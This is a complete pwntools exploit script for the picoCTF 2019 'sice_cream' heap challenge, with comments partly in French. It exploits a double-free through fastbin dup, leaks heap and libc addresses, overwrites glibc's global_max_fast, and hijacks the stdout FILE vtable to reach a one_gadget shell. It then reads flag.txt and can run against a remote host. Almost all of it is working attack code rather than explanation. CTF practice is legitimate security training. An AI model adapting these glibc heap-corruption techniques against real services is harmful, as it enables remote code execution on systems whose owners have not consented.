#!/usr/bin/env python3
# sice_cream (picoCTF 2019 / CyLab 55)
# stage1: double-free -> fastbin dup -> creams[] control -> fake unsorted chunk in name -> libc leak
# stage2: global_max_fast := unsorted_chunks (huge) -> fastbin slot write of p into
#         _IO_2_1_stdout_.vtable -> fake vtable in heap -> one_gadget
import os, sys
from pwn import *

context.log_level = os.environ.get('LOG', 'error')
context.arch = 'amd64'

OFF_UNSORTED  = 0x3c4b78
OFF_GMF       = 0x3c67f8
OFF_STDOUT_VT = 0x3c56f8
ONE_GADGETS   = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
FAKE_FAST     = 0x602120   # size @ name[0xe8]=0x61 (PREV_INUSE), user 0x602130

p = None
def start(mode='local', host=None, port=None):
    global p
    try:
        os.remove('/tmp/sc55/in.bin')
    except OSError:
        pass
    if mode == 'remote':
        p = remote(host, int(port))
    else:
        p = process(['./ld-2.23.so', '--library-path', '.', './sice_cream'],
                    stderr=process.STDOUT)
    _s = p.send
    def _tee(d, *a, **k):
        with open('/tmp/sc55/in.bin', 'ab') as f:
            f.write(d)
        return _s(d, *a, **k)
    p.send = _tee

def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')

def eat(idx, wait=True):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    if wait:
        return p.recvuntil(b'Yum!', timeout=5)

def reintro(data):
    p.recvuntil(b'> '); p.send(b'3\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Ah, right! How could a forget a name like ')
    return p.recvuntil(b'!', timeout=5)

def nbytes(hdrs, fill=b'A'):
    nm = bytearray(fill * 0x100)
    for off, val in hdrs.items():
        nm[off:off + 8] = p64(val)
    return bytes(nm)

def exploit(gadget_idx=0, nchunk=78, verbose=True):
    # ---- stage 1a: two real chunks + heap leak ----
    nm = bytearray(b'A' * 0x100)
    nm[0xf0:0xf8] = p64(0); nm[0xf8:0x100] = p64(0x60)
    p.recvuntil(b'Whats your name?'); p.recvuntil(b'> ')
    p.send(bytes(nm))
    buy(0x58, b'A' * 0x58)                 # slot0 = chunk0 (heap)
    buy(0x58, b'B' * 0x58)                 # slot1 = chunk1
    out = reintro(b'A' * 0x100)            # printf(name) runs into creams[0]
    hp = out[:-1][0x100:0x106]
    if len(hp) < 6:
        if verbose: log.warning("heap leak short"); return None
    heap = u64(hp + b'\x00\x00') - 0x10
    if verbose: log.info("heap = %#x" % heap)
    reintro(nbytes({0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))

    # ---- stage 1b: fastbin dup -> creams[] (payload arms the 0x602130 loop) ----
    eat(0); eat(1); eat(0)
    buy(0x58, p64(FAKE_FAST))
    buy(0x58, b'D' * 0x58)                                     # chunk1
    # chunk0 user data: [0]=0 [8]=0x61 (fake size of landmine L=chunk0+0x10) [0x10]=0x602130
    buy(0x58, p64(0) + p64(0x61) + p64(FAKE_FAST) + b'E' * 0x40)
    # FAKE_FAST=0x602120 -> malloc returns 0x602130, so creams[0] = payload[2]
    buy(0x58, p64(0) * 2 + p64(FAKE_FAST) + p64(0x602050) + p64(0) * 7)

    # ---- stage 1c: libc leak ----
    reintro(nbytes({0x08: 0x91, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(1)                                                      # free(0x602050) -> unsorted
    out = reintro(b'B' * 0x10)
    if verbose: log.warning("raw libc leak out=%r" % out)
    ptr = out[0x10:0x16]
    if len(ptr) < 6:
        if verbose: log.warning("libc leak short"); return None
    libc = u64(ptr + b'\x00\x00') - OFF_UNSORTED
    if libc & 0xfff:
        if verbose: log.warning("libc misaligned"); return None
    if verbose: log.success("libc = %#x" % libc)
    unsorted  = libc + OFF_UNSORTED
    gmf       = libc + OFF_GMF
    stdout_vt = libc + OFF_STDOUT_VT
    gadget    = libc + ONE_GADGETS[gadget_idx]
    if verbose: log.info("gadget=%#x stdout_vt=%#x gmf=%#x" % (gadget, stdout_vt, gmf))

    # name: V->size, V->bk=unsorted, reset-chunk size
    # V->prev_size (name[0]) et le qword en name[0x10] sont remis a 0 : sinon _int_free
    # consolide V (0x602040) vers 0x602030 et meurt sur "corrupted size vs. prev_size".
    # name[0x90] = prev_size du chunk suivant V(0x602040, size 0x90) : exige par unlink_chunk
    # de ce libc 2.23-0ubuntu11 (backport des checks 2.26) sinon "corrupted size vs. prev_size".
    reintro(nbytes({0x00: 0, 0x08: 0x91, 0x10: 0, 0x18: unsorted, 0x90: 0x90, 0x98: 0x21,
                    0xb8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))

    # The loop is already armed: fastbin[4] = 0x602120 and its fd (*(0x602130) = name[0xf0])
    # is FAKE_FAST, so every buy(0x58) pops it, returns 0x602130 and leaves the head armed.
    creams = [0] * 20
    creams[0] = FAKE_FAST
    creams[1] = 0x602050
    def freeslots():
        return [i for i in range(20) if creams[i] == 0]
    def reset(final=False):
        # malloc returns 0x602130 -> creams[i] = pay[i+2]  (creams[0..8] writable)
        # pay[0] s'ecrit en 0x602130 = fd du faux chunk : il DOIT valoir FAKE_FAST sinon
        # fastbin[4] est desarme apres le reset et les resets suivants ne rendent plus 0x602130.
        pay = [FAKE_FAST, 0, FAKE_FAST, 0, 0, 0, 0, 0, 0, 0, 0]
        if final:
            pay = [FAKE_FAST, 0, FAKE_FAST, heap + 0xe0, 0x602050, 0x602080, 0, 0, 0, 0, 0]
        # slot DOIT etre dans 0..10 : le payload ecrase creams[0..10], donc le pointeur
        # 0x602130 que buy() vient d'y ecrire. Un slot >=11 garderait 0x602130 -> divergence.
        s = [i for i in range(9) if creams[i] == 0][0]
        buy(0x58, b''.join(p64(x) for x in pay))     # pops FAKE_FAST -> user 0x602130
        vals = pay[2:] + [0, 0]
        # le read de 0x58 o couvre 0x602130..0x602188 = creams[0..8] seulement
        for i in range(9):
            creams[i] = vals[i]
        return s

    # ---- heap grooming with 0x50-class chunks (fastbin[5] stays empty) ----
    S = 0x17b0
    p_addr = heap + 0xe0
    pay0    = bytearray(b'C' * 0x48); pay0[8:16] = p64(S); pay0[0x30:0x38] = p64(gadget)
    made = 0
    if os.environ.get('LEAKGEO'):
        pay = [FAKE_FAST, 0] + [0x4141414141414141] * 4 + [0] * 5
        buy(0x58, b''.join(p64(x) for x in pay))
        for i in range(9):
            creams[i] = pay[2 + i]
    while made < nchunk:
        free_low = [i for i in range(9) if creams[i] == 0]
        if len(free_low) < 2:
            reset()
            free_low = [i for i in range(9) if creams[i] == 0]
        s = free_low[0]
        if made == 0:
            data = bytes(pay0)
        elif made == 76:
            # chunk #76 : user 0x18f0, +8 = p+S+8 -> doit valoir 0x51 pour
            # passer le controle `free(): invalid next size (fast)`
            data = p64(0) + p64(0x51) + b'C' * 0x38
        else:
            data = b'C' * 0x48
        buy(0x48, data)
        if os.environ.get('LEAKGEO') and made == 0:
            o = reintro(b'B' * 0x100)
            log.warning('LEAKGEO tail=%s' % o[0x100:0x150].hex())
            ptr = o[0x100:0x150][0x20:0x26]
            log.warning('LEAKGEO creams[4] raw=%r -> %#x (heap=%#x, delta=%#x)' %
                        (ptr, u64(ptr + b'\x00\x00') if len(ptr) == 6 else 0,
                         heap, (u64(ptr + b'\x00\x00') - heap) if len(ptr) == 6 else 0))
            return None
        creams[s] = 1
        made += 1
    if verbose: log.info("groomed %d x 0x50 chunks; p=%#x" % (made, p_addr))

    # ---- final reset: creams[1]=p, [2]=V1user, [3]=V2user ----
    reset(final=True)

    # ---- stage 2a: global_max_fast = unsorted (2 fake unsorted chunks in name) ----
    reintro(nbytes({0x08: 0x91, 0x38: 0x91, 0x98: 0x21, 0xb8: 0x21,
                    0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(2)                                  # free V1 (user 0x602050)
    eat(3)                                  # free V2 (user 0x602080)
    # V1->size = 0x51 pour que `size == nb` (buy(0x48) -> nb=0x50) : _int_malloc fait
    # alors le unlink (bck->fd = unsorted -> *gmf) PUIS retourne immediatement, au lieu de
    # reboucler sur unsorted->bk = gmf-0x10 (=> malloc(): memory corruption).
    reintro(nbytes({0x08: 0x51, 0x10: 0, 0x18: gmf - 0x10, 0x50: 0x50, 0x58: 0x21,
                    0x38: 0x91, 0x88: unsorted,
                    0x98: 0x21, 0xb8: 0x21, 0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))
    buy(0x48, b'Q' * 0x48)                  # unsorted loop -> bck->fd = unsorted -> *gmf
    if verbose: log.info("gmf written; freeing p")

    # ---- stage 2b: free(p) -> fastbin[377] -> stdout.vtable = p ----
    eat(1)
    return libc

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    host = sys.argv[2] if len(sys.argv) > 2 else None
    port = sys.argv[3] if len(sys.argv) > 3 else None
    for gi in range(len(ONE_GADGETS)):
        if p:
            try: p.close()
            except Exception: pass
        try:
            start(mode, host, port)
            r = exploit(gadget_idx=gi)
        except Exception as e:
            log.warning("gadget %#x: %r" % (ONE_GADGETS[gi], e)); continue
        if r is None:
            continue
        try:
            p.sendline(b'echo ---PWNED---; cat flag.txt; exit')
            out = p.recvrepeat(2)
            sys.stdout.write(out.decode('latin1'))
            if b'PWNED' in out:
                print("[+] SHELL with gadget %#x" % ONE_GADGETS[gi]); return
        except Exception as e:
            log.warning("shell: %r" % e)
    print("[-] no shell")

if __name__ == '__main__':
    main()
